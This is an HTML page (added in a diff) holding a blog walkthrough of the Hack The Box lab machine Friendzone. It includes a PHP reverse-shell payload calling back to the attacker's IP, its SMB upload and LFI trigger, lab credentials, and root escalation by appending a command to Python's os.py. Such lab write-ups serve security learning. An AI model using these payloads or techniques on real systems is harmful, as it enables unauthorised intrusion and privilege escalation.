@@ -1,0 +1,654 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#FFFFFF" />
+  
+  <title>Hack The Box - Friendzone &middot; Congo</title>
+    <meta name="title" content="Hack The Box - Friendzone &middot; Congo" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
+    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.8d03f49bff76158e114fdf6d18be3ad4d3b70309a01aebb97468ef8fd8d3b50a.css"
+    integrity="sha256-jQP0m/92FY4RT99tGL461NO3AwmgGuu5dGjvj9jTtQo="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        Today, we are going to pwn Friendzone from Hack The Box.
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/blog/friendzone/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/blog/friendzone/">
+  <meta property="og:site_name" content="Congo">
+  <meta property="og:title" content="Hack The Box - Friendzone">
+  <meta property="og:description" content="Today, we are going to pwn Friendzone from Hack The Box.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2019-07-12T00:00:00+00:00">
+    <meta property="article:modified_time" content="2019-07-12T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="Hack The Box - Friendzone">
+<meta name="twitter:description" content="Today, we are going to pwn Friendzone from Hack The Box.">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blogs",
+    "name": "Hack The Box - Friendzone",
+    "headline": "Hack The Box - Friendzone",
+    
+    "abstract": "Today, we are going to pwn Friendzone from Hack The Box.",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/blog\/friendzone\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2019",
+    "dateCreated": "2019-07-12T00:00:00\u002b00:00",
+    "datePublished": "2019-07-12T00:00:00\u002b00:00",
+    
+    "dateModified": "2019-07-12T00:00:00\u002b00:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "566"
+  }
+  </script>
+
+
+  
+  
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Congo</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href=""
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+            
+              
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Hack The Box - Friendzone
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2019-07-12 00:00:00 &#43;0000 UTC">12 July 2019</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <p>Today, we are going to pwn Friendzone from Hack The Box.</p>
+<!-- more -->
+<h1 id="methodology" class="relative group">Methodology <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#methodology" aria-label="Anchor">#</a></span></h1><ul>
+<li>Nmap scan of the machine</li>
+<li>Checking SMB service and HTTP</li>
+<li>Using <code>dig</code> to get subdomians</li>
+<li>Uploading PHP reverse shell</li>
+<li>Callback the reverse shell by exploiting LFI(Local File Inclusion)</li>
+<li>Getting user flag and SSH credentials</li>
+<li>Using cronjob to get root flag</li>
+</ul>
+<h1 id="nmap" class="relative group">Nmap <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#nmap" aria-label="Anchor">#</a></span></h1><p>Starting off with the nmap, <code>nmap -sV -sC -A 10.10.10.123</code> shows so many open ports but we have to start somewhere.
+It includes:-</p>
+<ul>
+<li>21 - FTP</li>
+<li>22 - SSH</li>
+<li>53 - DNS</li>
+<li>80 - HTTP</li>
+<li>139 &amp; 445 - SMB</li>
+<li>443 - SSL/HTTP</li>
+</ul>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/friendzone/nmap.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<h1 id="smb-and-http-enumeration" class="relative group">SMB and HTTP Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#smb-and-http-enumeration" aria-label="Anchor">#</a></span></h1><p>Using smbmap reveals we have access to <code>general</code> for read only and <code>Development</code> for read/write access.
+So, we connect to <code>SMB</code> by using <code>smbclient //10.10.10.123/general/ -u root</code>  reveals we see <code>creds.txt</code> so we get it on our machine.</p>
+<p>Now, <code>Developement</code> seems empty so I headover to HTTP port, it was basic html page without only one useful information <strong>subdomain</strong>. We noticed it has a subdomian named <code>friendzone.red</code>.
+Running <code>gobuster</code> reveals nothing useful, so I moved on to DNS recon.</p>
+<h1 id="dns-enumeration-and-login" class="relative group">DNS Enumeration and Login <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#dns-enumeration-and-login" aria-label="Anchor">#</a></span></h1><p>Using <code>dig axrf friendzone.red @10.10.10.123</code> reveals a <code>administartor1.friendzone.red</code> so heading over to that shows a login page, loggin with the previous obtained credentials <code>admin:WORKWORKHhallelujah@#</code> , tell us to redirect to <code>dashboard.php</code>.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/friendzone/dig.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/friendzone/admin.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/friendzone/creds.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<h1 id="exploiting-lfi-vulnerability-and-callback-reverse-shell" class="relative group">Exploiting LFI vulnerability and callback Reverse Shell <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exploiting-lfi-vulnerability-and-callback-reverse-shell" aria-label="Anchor">#</a></span></h1><p>This page seems told us to access url <code>default is image_id=a.jpg&amp;pagename=timestamp</code>, seems LFI isn&rsquo;t it?</p>
+<p>From previous SMB enumeration we knew that <code>Development</code> directory has read/write access so using php reverse shell wecan get access to friendzone machine.</p>
+<p>Using folllowing code as <code>phpinfo.php</code>:-</p>
+<pre tabindex="0"><code>
+&lt;?php
+exec(“/bin/bash -c ‘bash -i &gt;&amp; /dev/tcp/10.10.14.156/1234 0&gt;&amp;1’”);
+phpinfo();
+?&gt;
+</code></pre><p>we uploaded it to <code>Development </code> directory by</p>
+<p><code>curl --upload-file phpinfo.php -u 'root' smb://10.10.10.123/Development/</code>, we uploaded our shell.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/friendzone/rev.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<h4 id="callback" class="relative group">Callback <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#callback" aria-label="Anchor">#</a></span></h4><p>From previously found LFI, we access the our phpinfo file by
+<code>https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&amp;pagename=/etc/Development/phpinfo</code></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/friendzone/lfi.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Not <code>a.jpg</code> because it was default so no need to, so back to our listener we get a shell.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/friendzone/revs.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<h4 id="user-flag" class="relative group">User Flag <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#user-flag" aria-label="Anchor">#</a></span></h4><p>Once your listener get connected to our uploaded reverse shell you can get user flag.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/friendzone/user.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<h1 id="getting-ssh-credentials" class="relative group">Getting SSH Credentials <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#getting-ssh-credentials" aria-label="Anchor">#</a></span></h1><p>Checking directory and file reveals a interseting file named <code>mysql_data.conf</code> has following credentials:-</p>
+<hr>
+<blockquote>
+<p>for development process this is the mysql creds for user friend</p>
+</blockquote>
+<blockquote>
+<p>db_user=friend</p>
+</blockquote>
+<p>db_pass=Agpyu12!0.213$</p>
+<blockquote>
+<p>db_name=FZ</p>
+</blockquote>
+<hr>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/friendzone/sshcreds.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<h1 id="ssh-login-and-root-flag" class="relative group">SSH Login and root flag <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#ssh-login-and-root-flag" aria-label="Anchor">#</a></span></h1><p>Well, we login to ssh using previous credentials.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/friendzone/ssh.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<h3 id="analyzing-running-processes" class="relative group">Analyzing Running Processes <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#analyzing-running-processes" aria-label="Anchor">#</a></span></h3><p>There was a ELF file named <code>pspy64</code>, executing it shows running jobs in which we can very interesting process whuch was a python file.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/friendzone/cronjob.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Head over <code>/opt/server_admin/reporter.py</code> shows a nothing more than bunch of commented out line of python code.</p>
+<pre tabindex="0"><code>
+#!/usr/bin/python
+
+import os
+
+to_address = “admin1@friendzone.com”
+from_address = “
+admin2@friendzone.com”
+
+print “[+] Trying to send email to %s”%to_address
+
+#command = ‘’’ mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass “PAPAP”’’’
+
+#os.system(command)
+
+# I need to edit the script later
+# Sam ~ python developer
+</code></pre><p>We can see a line importing python os module, since we don&rsquo;t have modify permissions for reporter.py we head over <code>/usr/bin/python2.7</code>  we can edit os.py i.e python&rsquo;s <code>os</code> module which has a function which allows us to execute any command by passing them as parameter.</p>
+<p>For example:-</p>
+<pre tabindex="0"><code>
+import os
+os.sytem(&#39;whoami&#39;) #friend
+</code></pre><p>So we add a single line of code at the very end of <code>os.py</code></p>
+<pre tabindex="0"><code>
+system(&#39;cp /root/root.txt /tmp/root1.txt&#39;) # calling system functon and copying flag
+</code></pre><p>Hence, waiting for few minutes gives <code>root1.txt</code>.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/friendzone/root.jpg" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p><strong>Done!!</strong></p>
+<img src="https://www.hackthebox.eu/badge/image/129534" alt="Hack The Box">
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+    <div class="place-self-center">
+      
+      
+      <div class="text-2xl sm:text-lg">
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/blog/smfonos/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Vulnhub - Symfonos</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2019-07-06 00:00:00 &#43;0000 UTC">6 July 2019</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/blog/pumpkin-garden/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Vulnhub - PumpkinRaising</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2019-07-17 00:00:00 &#43;0000 UTC">17 July 2019</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2024
+            
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
